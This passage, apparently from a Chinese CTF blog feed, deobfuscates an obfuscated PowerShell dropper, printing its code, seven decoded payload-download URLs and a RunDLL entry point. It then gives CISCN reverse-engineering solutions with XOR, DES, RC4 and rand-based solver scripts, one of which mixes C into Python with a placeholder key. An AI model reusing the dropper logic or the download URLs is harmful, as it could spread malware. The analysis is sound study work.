class="hljs-string">&#x27;rey&#x27;</span>+<span class="hljs-string">&#x27;t&#x27;</span>+<span class="hljs-string">&#x27;usin&#x27;</span>)+(<span class="hljs-string">&#x27;ys&#x27;</span>+<span class="hljs-string">&#x27;s/wp&#x27;</span>)+(<span class="hljs-string">&#x27;-co&#x27;</span>+<span class="hljs-string">&#x27;nte&#x27;</span>+<span class="hljs-string">&#x27;nt&#x27;</span>)+(<span class="hljs-string">&#x27;/&#x27;</span>+<span class="hljs-string">&#x27;nuW&#x27;</span>+<span class="hljs-string">&#x27;/@]e1r[&#x27;</span>)+<span class="hljs-string">&#x27;S&#x27;</span>+(<span class="hljs-string">&#x27;s:/&#x27;</span>+<span class="hljs-string">&#x27;/&#x27;</span>+<span class="hljs-string">&#x27;su&#x27;</span>+<span class="hljs-string">&#x27;ieopt&#x27;</span>)+<span class="hljs-string">&#x27;o&#x27;</span>+<span class="hljs-string">&#x27;mi&#x27;</span>+(<span class="hljs-string">&#x27;pe&#x27;</span>+<span class="hljs-string">&#x27;co&#x27;</span>)+<span class="hljs-string">&#x27;m&#x27;</span>+(<span class="hljs-string">&#x27;/&#x27;</span>+<span class="hljs-string">&#x27;we&#x27;</span>)+(<span class="hljs-string">&#x27;11&#x27;</span>+<span class="hljs-string">&#x27;-&#x27;</span>)+(<span class="hljs-string">&#x27;kn&#x27;</span>+<span class="hljs-string">&#x27;xwn/&#x27;</span>+<span class="hljs-string">&#x27;Ss&#x27;</span>)+(<span class="hljs-string">&#x27;E&#x27;</span>+<span class="hljs-string">&#x27;s/&#x27;</span>)).replace((<span class="hljs-string">&#x27;]&#x27;</span>+(<span class="hljs-string">&#x27;e&#x27;</span>+<span class="hljs-string">&#x27;1r[&#x27;</span>)+<span class="hljs-string">&#x27;S&#x27;</span>),([<span class="hljs-built_in">array</span>](<span class="hljs-string">&#x27;sd&#x27;</span>,<span class="hljs-string">&#x27;sw&#x27;</span>),(<span class="hljs-string">&#x27;ht&#x27;</span>+<span class="hljs-string">&#x27;tp&#x27;</span>),<span class="hljs-string">&#x27;3d&#x27;</span>)[<span class="hljs-number">1</span>]).SpLit(<span class="hljs-variable">$R71P</span> + <span class="hljs-variable">$U1uh748</span> + <span class="hljs-variable">$X49R</span>);<br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$Ml3evql</span><br></code></pre></td></tr></table></figure><p>得到</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>ansvatcom<span class="hljs-regexp">/sp-ddmin/</span>fw/<br>http:<span class="hljs-regexp">//gi</span>ttheindkadirectorlcom<span class="hljs-regexp">/2/</span>qOYwT/<br>http:<span class="hljs-regexp">//</span>elogsg4gtechntlogiescom<span class="hljs-regexp">/byous/</span>v/<br>http:<span class="hljs-regexp">//</span>pattayistooecom<span class="hljs-regexp">/vipio-zetwoxk-1hmpp/</span>c5/<br>http:<span class="hljs-regexp">//</span>rsvmabinnhcom<span class="hljs-regexp">/mp-contqnt/</span><span class="hljs-number">16</span>qT/<br>https:<span class="hljs-regexp">//</span>eenmoreytusinyss<span class="hljs-regexp">/wp-content/</span>nuW/<br>https:<span class="hljs-regexp">//</span>suieoptomipecom<span class="hljs-regexp">/we11-knxwn/</span>SsEs/<br></code></pre></td></tr></table></figure><p>看起来是下载链接</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$F4mnqaf</span>=<span class="hljs-variable">$HOME</span>+((<span class="hljs-string">&#x27;&#123;0&#125;Z3t&#x27;</span>+(<span class="hljs-string">&#x27;nc&#x27;</span>+<span class="hljs-string">&#x27;5d&#x27;</span>)+<span class="hljs-string">&#x27;&#123;0&#125;L6z3&#x27;</span>+<span class="hljs-string">&#x27;oo3&#123;0&#x27;</span>+<span class="hljs-string">&#x27;&#125;&#x27;</span>) <span class="hljs-operator">-f</span>[<span class="hljs-built_in">cHar</span>]<span class="hljs-number">92</span>)+<span class="hljs-variable">$Vlzczi0</span>+(<span class="hljs-string">&#x27;&#x27;</span>+(<span class="hljs-string">&#x27;dl&#x27;</span>+<span class="hljs-string">&#x27;l&#x27;</span>));<br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$F4mnqaf</span><br>((<span class="hljs-string">&#x27;C&#x27;</span>+<span class="hljs-string">&#x27;ontro&#x27;</span>+<span class="hljs-string">&#x27;1_Ru&#x27;</span>)+<span class="hljs-string">&#x27;nD&#x27;</span>+<span class="hljs-string">&#x27;L&#x27;</span>+<span class="hljs-string">&#x27;L&#x27;</span>).tOsTrING()<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/quietdawn/picture/main/8.jpg"></p><p>得到Contro1_RunDLL</p><p>观察整体的代码逻辑，判断获得的应该就是程序启动参数</p><p>则flag{Contro1_RunDLL}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Ciscn Reverse</title>
    <link href="/2024/06/05/Ciscn-Reverse/"/>
    <url>/2024/06/05/Ciscn-Reverse/</url>
    
    <content type="html"><![CDATA[<h1 id="Ciscn-Reverse"><a href="#Ciscn-Reverse" class="headerlink" title="Ciscn Reverse"></a>Ciscn Reverse</h1><p>更新更新博客，复现了一下国赛的四个题。</p><h2 id="Asm-re"><a href="#Asm-re" class="headerlink" title="Asm_re"></a>Asm_re</h2><p>给了一个txt，是arm的汇编导出</p><p><img src="https://raw.githubusercontent.com/quietdawn/picture/main/1.%20png.PNG"></p><p>分析得到如下逻辑</p><p><img src="https://raw.githubusercontent.com/quietdawn/picture/main/2.JPEG"></p><p>exp如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>        <span class="hljs-type">int</span> str[]=&#123;<br>        <span class="hljs-number">0x1fd7</span>,<span class="hljs-number">0x21b7</span>,<span class="hljs-number">0x1e47</span>,<span class="hljs-number">0x2027</span>,<span class="hljs-number">0x26e7</span>,<br>        <span class="hljs-number">0x10d7</span>,<span class="hljs-number">0x1127</span>,<span class="hljs-number">0x2007</span>,<span class="hljs-number">0x11c7</span>,<span class="hljs-number">0x1e47</span>,<br>        <span class="hljs-number">0x1017</span>,<span class="hljs-number">0x1017</span>,<span class="hljs-number">0x11f7</span>,<span class="hljs-number">0x2007</span>,<span class="hljs-number">0x1037</span>,<br>        <span class="hljs-number">0x1107</span>,<span class="hljs-number">0x1f17</span>,<span class="hljs-number">0x10d7</span>,<span class="hljs-number">0x1017</span>,<span class="hljs-number">0x1017</span>,<br>        <span class="hljs-number">0x1f67</span>,<span class="hljs-number">0x1017</span>,<span class="hljs-number">0x11c7</span>,<span class="hljs-number">0x11c7</span>,<span class="hljs-number">0x1017</span>,<br>        <span class="hljs-number">0x1fd7</span>,<span class="hljs-number">0x1f17</span>,<span class="hljs-number">0x1107</span>,<span class="hljs-number">0x0f47</span>,<span class="hljs-number">0x1127</span>,<br>        <span class="hljs-number">0x1037</span>,<span class="hljs-number">0x1e47</span>,<span class="hljs-number">0x1037</span>,<span class="hljs-number">0x1fd7</span>,<span class="hljs-number">0x1107</span>,<br>        <span class="hljs-number">0x1fd7</span>,<span class="hljs-number">0x1107</span>,<span class="hljs-number">0x2787</span><br>        &#125;;<br>        <br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">38</span>;i++)<br>        &#123;<br>                <span class="hljs-type">int</span> t=str[i]<span class="hljs-number">-0x1e</span>;<br>                t^=<span class="hljs-number">0x4d</span>;<br>                t-=<span class="hljs-number">0x14</span>;<br>                t/=<span class="hljs-number">0x50</span>;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,t);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>得到flag</p><p>flag：flag{67e9a228e45b622c2992fb5174a4f5f5}</p><h2 id="Androidso-re"><a href="#Androidso-re" class="headerlink" title="Androidso_re"></a>Androidso_re</h2><p>jadx打开看到主逻辑是一个DES加密</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">package</span> com.example.re11113;<br><span class="hljs-keyword">import</span> android.util.Base64;<br><span class="hljs-keyword">import</span> java.nio.charset.StandardCharsets;<br><span class="hljs-keyword">import</span> java.util.Arrays;<br><span class="hljs-keyword">import</span> javax.crypto.Cipher;<br><span class="hljs-keyword">import</span> javax.crypto.spec.IvParameterSpec;<br><span class="hljs-keyword">import</span> javax.crypto.spec.SecretKeySpec;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">inspect</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">inspect</span><span class="hljs-params">(String input_str)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">byte</span>[] input_flag = input_str.getBytes(StandardCharsets.UTF_8);<br>            <span class="hljs-type">byte</span>[] str2 = jni.getkey().getBytes(StandardCharsets.UTF_8);<br>            Arrays.copyOf(str2, <span class="hljs-number">8</span>);<br>            <span class="hljs-type">SecretKeySpec</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(str2, <span class="hljs-string">&quot;AES&quot;</span>);<br>            <span class="hljs-type">byte</span>[] ivBytes = jni.getiv().getBytes(StandardCharsets.UTF_8);<br>            <span class="hljs-type">IvParameterSpec</span> <span class="hljs-variable">iv</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IvParameterSpec</span>(ivBytes);<br>            <span class="hljs-type">Cipher</span> <span class="hljs-variable">cipher</span> <span class="hljs-operator">=</span> Cipher.getInstance(<span class="hljs-string">&quot;DES/CBC/PKCS5Padding&quot;</span>);<br>            cipher.init(<span class="hljs-number">1</span>, key, iv);<br>            <span class="hljs-type">byte</span>[] encryptedBytes = cipher.doFinal(input_flag);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">encryptedFlag</span> <span class="hljs-operator">=</span> Base64.encodeToString(encryptedBytes, <span class="hljs-number">0</span>).trim();<br>            <span class="hljs-type">boolean</span> <span class="hljs-variable">bool</span> <span class="hljs-operator">=</span> encryptedFlag.equals(<span class="hljs-string">&quot;JqslHrdvtgJrRs2QAp+FEVdwRPNLswrnykD/sZMivmjGRKUMVIC/rw==&quot;</span>);<br>            <span class="hljs-keyword">if</span>(!bool) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception exception) &#123;<br>            exception.printStackTrace();<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>那么我们需要获得key和iv</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">jni</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">native</span> String <span class="hljs-title function_">getiv</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">native</span> String <span class="hljs-title function_">getkey</span><span class="hljs-params">()</span><br>    <span class="hljs-keyword">static</span> &#123;<br>        System.loadLibrary(<span class="hljs-string">&quot;Secret_entrance&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>分析得知在本地的native库里存有两个函数</p><p>apktool d app-debug.apk</p><p>一个rc4解密获得key</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> ARC4<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_decrypt</span>(<span class="hljs-params">ciphertext, key</span>):<br>    cipher = ARC4.new(key)<br>    decrypted_data = cipher.decrypt(ciphertext)<br>    <span class="hljs-keyword">return</span> decrypted_data<br><br>key = <span class="hljs-string">b&#x27;YourRC4Key&#x27;</span><br><br>ciphertext = <span class="hljs-string">&quot;TFSecret_Key&quot;</span>.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br>decrypted_data = rc4_decrypt(ciphertext, key)<br><span class="hljs-built_in">print</span>(decrypted_data.decode())<br><span class="hljs-comment">#include&lt;stdio.h&gt;</span><br><span class="hljs-built_in">int</span> main()<br>&#123;<br>        <span class="hljs-built_in">int</span> a[]=&#123;<span class="hljs-number">0x42</span>,<span class="hljs-number">0xb1</span>,<span class="hljs-number">0x66</span>,<span class="hljs-number">0xdc</span>,<span class="hljs-number">0x03</span>,<span class="hljs-number">0x6d</span>,<span class="hljs-number">0x45</span>,<span class="hljs-number">0x1b</span>&#125;;<br>        a[<span class="hljs-number">0</span>]^=<span class="hljs-number">0x3</span>;<br>        a[<span class="hljs-number">1</span>]^=<span class="hljs-number">0x89</span>;<br>        a[<span class="hljs-number">2</span>]^=<span class="hljs-number">0x33</span>;<br>        a[<span class="hljs-number">3</span>]^=<span class="hljs-number">0xb8</span>;<br>        a[<span class="hljs-number">4</span>]^=<span class="hljs-number">0x54</span>;<br>        a[<span class="hljs-number">5</span>]^=0xcu;<br>        a[<span class="hljs-number">6</span>]^=<span class="hljs-number">0x20</span>;<br>        a[<span class="hljs-number">7</span>]^=<span class="hljs-number">0x6a</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-built_in">int</span> i=<span class="hljs-number">0</span>;i&lt;=<span class="hljs-number">7</span>;i++)<br>        printf(<span class="hljs-string">&quot;%c&quot;</span>,a[i]);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>key：A8UdWaeq</p><p>iv是一个rot16+base64</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rot16_decrypt_bytes</span>(<span class="hljs-params">data</span>):<br>    result = <span class="hljs-built_in">bytearray</span>()<br>    <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> data:<br>        <span class="hljs-keyword">if</span> <span class="hljs-number">97</span> &lt;= byte &lt;= <span class="hljs-number">122</span>: <br>            result.append((byte - <span class="hljs-number">97</span> + <span class="hljs-number">16</span>) % <span class="hljs-number">26</span> + <span class="hljs-number">97</span>)<br>        <span class="hljs-keyword">elif</span> <span class="hljs-number">65</span> &lt;= byte &lt;= <span class="hljs-number">90</span>:  <br>            result.append((byte - <span class="hljs-number">65</span> + <span class="hljs-number">16</span>) % <span class="hljs-number">26</span> + <span class="hljs-number">65</span>)<br>        <span class="hljs-keyword">else</span>:<br>            result.append(byte)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(result)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rot16_base64_decode</span>(<span class="hljs-params">encoded_data</span>):<br>    rot16_decoded_bytes = rot16_decrypt_bytes(encoded_data)<br><br>    base64_decoded = base64.b64decode(rot16_decoded_bytes)<br>  <br>    <span class="hljs-keyword">return</span> base64_decoded<br><br>encoded_text = <span class="hljs-string">b&quot;F2IjBOh1mRW=&quot;</span>  <br>decoded_data = rot16_base64_decode(encoded_text)<br><span class="hljs-keyword">if</span> decoded_data:<br>    <span class="hljs-built_in">print</span>(decoded_data)<br></code></pre></td></tr></table></figure><p>iv：Wf3DLups</p><p>有了iv和key进行DES解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> DES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> unpad<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">des_cbc_decrypt</span>(<span class="hljs-params">ciphertext_base64, key, iv</span>):<br>    ciphertext = base64.b64decode(ciphertext_base64)<br>    <br>    cipher = DES.new(key, DES.MODE_CBC, iv)<br>    <br>    decrypted_data = unpad(cipher.decrypt(ciphertext), DES.block_size)<br>    <br>    <span class="hljs-keyword">return</span> decrypted_data<br><br>key = <span class="hljs-string">b&#x27;A8UdWaeq&#x27;</span><br><br>iv = <span class="hljs-string">b&#x27;Wf3DLups&#x27;</span><br><br>ciphertext_base64 = <span class="hljs-string">&#x27;JqslHrdvtgJrRs2QAp+FEVdwRPNLswrnykD/sZMivmjGRKUMVIC/rw==&#x27;</span><br><br>decrypted_data = des_cbc_decrypt(ciphertext_base64, key, iv)<br><span class="hljs-built_in">print</span>(decrypted_data.decode())<br></code></pre></td></tr></table></figure><p>得到flag</p><p>flag：flag{188cba3a5c0fbb2250b5a2e590c391ce}</p><h2 id="WhereThel1b"><a href="#WhereThel1b" class="headerlink" title="WhereThel1b"></a>WhereThel1b</h2><p>给了一个python文件和一个so文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> whereThel1b<br><br>flag = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;where is my flag:&quot;</span>)<br>flag = flag.encode()<br>encry = [<span class="hljs-number">108</span>, <span class="hljs-number">117</span>, <span class="hljs-number">72</span>, <span class="hljs-number">80</span>, <span class="hljs-number">64</span>, <span class="hljs-number">49</span>, <span class="hljs-number">99</span>, <span class="hljs-number">19</span>, <span class="hljs-number">69</span>, <span class="hljs-number">115</span>, <span class="hljs-number">94</span>, <span class="hljs-number">93</span>, <span class="hljs-number">94</span>, <span class="hljs-number">115</span>, <span class="hljs-number">71</span>, <span class="hljs-number">95</span>, <span class="hljs-number">84</span>, <span class="hljs-number">89</span>, <span class="hljs-number">56</span>, <span class="hljs-number">101</span>, <span class="hljs-number">70</span>, <span class="hljs-number">2</span>, <span class="hljs-number">84</span>, <span class="hljs-number">75</span>, <span class="hljs-number">127</span>, <span class="hljs-number">68</span>, <span class="hljs-number">103</span>, <span class="hljs-number">85</span>, <span class="hljs-number">105</span>, <span class="hljs-number">113</span>, <span class="hljs-number">80</span>, <span class="hljs-number">103</span>, <span class="hljs-number">95</span>, <span class="hljs-number">67</span>, <span class="hljs-number">81</span>, <span class="hljs-number">7</span>, <span class="hljs-number">113</span>, <span class="hljs-number">70</span>, <span class="hljs-number">47</span>, <span class="hljs-number">73</span>, <span class="hljs-number">92</span>, <span class="hljs-number">124</span>, <span class="hljs-number">93</span>, <span class="hljs-number">120</span>, <span class="hljs-number">104</span>, <span class="hljs-number">108</span>, <span class="hljs-number">106</span>, <span class="hljs-number">17</span>, <span class="hljs-number">80</span>, <span class="hljs-number">102</span>, <span class="hljs-number">101</span>, <span class="hljs-number">75</span>, <span class="hljs-number">93</span>, <span class="hljs-number">68</span>, <span class="hljs-number">121</span>, <span class="hljs-number">26</span>]<br>whereThel1b.whereistheflag(flag)<br>ret = whereThel1b.trytry(flag)<br><br><span class="hljs-keyword">if</span> ret == encry:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;rrrrrrrrrrrright&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;wwwwwwwwwwwwwwwrong&quot;</span>)<br></code></pre></td></tr></table></figure><p>运行后发现调用了whereThel1b</p><p>接收了一个base64加密的对象进行处理</p><p>进入so发现trytry函数调用了whereistheflag1</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">if</span> ( _pyx_mstate_global_static.__pyx_d[<span class="hljs-number">1</span>].ob_type != (PyTypeObject *)_pyx_dict_version_4 )<br>  &#123;<br>    ModuleGlobalName = _Pyx__GetModuleGlobalName(<br>                         _pyx_mstate_global_static.__pyx_n_s_whereistheflag1,<br>                         &amp;_pyx_dict_version_4,<br>                         &amp;_pyx_dict_cached_value_3);<br></code></pre></td></tr></table></figure><p>跟进查看whereistheflag1</p><p>设置了种子seed（0）然后进行的异或操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs C">v36 = PyNumber_Xor(v35, v34);<br></code></pre></td></tr></table></figure><p>所以我们先进行异或处理再进行base64解密</p><p>exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> base64<br><br>encry = [<span class="hljs-number">108</span>, <span class="hljs-number">117</span>, <span class="hljs-number">72</span>, <span class="hljs-number">80</span>, <span class="hljs-number">64</span>, <span class="hljs-number">49</span>, <span class="hljs-number">99</span>, <span class="hljs-number">19</span>, <span class="hljs-number">69</span>, <span class="hljs-number">115</span>, <span class="hljs-number">94</span>, <span class="hljs-number">93</span>, <span class="hljs-number">94</span>, <span class="hljs-number">115</span>, <span class="hljs-number">71</span>, <span class="hljs-number">95</span>, <span class="hljs-number">84</span>, <span class="hljs-number">89</span>, <span class="hljs-number">56</span>, <span class="hljs-number">101</span>, <span class="hljs-number">70</span>, <span class="hljs-number">2</span>, <span class="hljs-number">84</span>, <span class="hljs-number">75</span>, <span class="hljs-number">127</span>, <span class="hljs-number">68</span>, <span class="hljs-number">103</span>, <span class="hljs-number">85</span>, <span class="hljs-number">105</span>, <span class="hljs-number">113</span>, <span class="hljs-number">80</span>, <span class="hljs-number">103</span>, <span class="hljs-number">95</span>, <span class="hljs-number">67</span>, <span class="hljs-number">81</span>, <span class="hljs-number">7</span>, <span class="hljs-number">113</span>, <span class="hljs-number">70</span>, <span class="hljs-number">47</span>, <span class="hljs-number">73</span>, <span class="hljs-number">92</span>, <span class="hljs-number">124</span>, <span class="hljs-number">93</span>, <span class="hljs-number">120</span>, <span class="hljs-number">104</span>, <span class="hljs-number">108</span>, <span class="hljs-number">106</span>, <span class="hljs-number">17</span>, <span class="hljs-number">80</span>, <span class="hljs-number">102</span>, <span class="hljs-number">101</span>, <span class="hljs-number">75</span>, <span class="hljs-number">93</span>, <span class="hljs-number">68</span>, <span class="hljs-number">121</span>, <span class="hljs-number">26</span>]<br>random.seed(<span class="hljs-number">0</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(encry)):<br>    encry[i] ^= random.randint(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(encry))<br>byte_data = <span class="hljs-built_in">bytes</span>(encry)<br>base64_bytes=base64.b64decode(byte_data)<br><span class="hljs-built_in">print</span>(base64_bytes)<br></code></pre></td></tr></table></figure><p>得到flag</p><p>flag:flag{7f9a2d3c-07de-11ef-be5e-cf1e88674c0b}</p><h2 id="Gdb-debug"><a href="#Gdb-debug" class="headerlink" title="Gdb_debug"></a>Gdb_debug</h2><p>浏览代码发现是用随机数种子生成的两组随机数并进行的加密操作，结合题目提示动静结合可知需要动调一下，</p><p>动调之后发现随机数种子为0LL</p><p><img src="https://raw.githubusercontent.com/quietdawn/picture/main/3.png"></p><p>由于随机数的随机性，我们这里写一个随机数的生成脚本进行随机数的生成并使用，</p><p>为elf文件，gcc编译生成可执行文件并运行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>        srand(time(<span class="hljs-number">0LL</span>)&amp;<span class="hljs-number">0xF0000000</span>);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;=<span class="hljs-number">38</span>;i++)<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0x%x,&quot;</span>,rand()&amp;<span class="hljs-number">0xff</span>);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> l=<span class="hljs-built_in">strlen</span>(<span class="hljs-string">&quot;flag&#123;12345678901234567890123456789012&#125;&quot;</span>)<span class="hljs-number">-2</span>;l&gt;=<span class="hljs-number">0</span>;l--)<br>                rand();<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;=<span class="hljs-number">38</span>;i++)<br>        <span 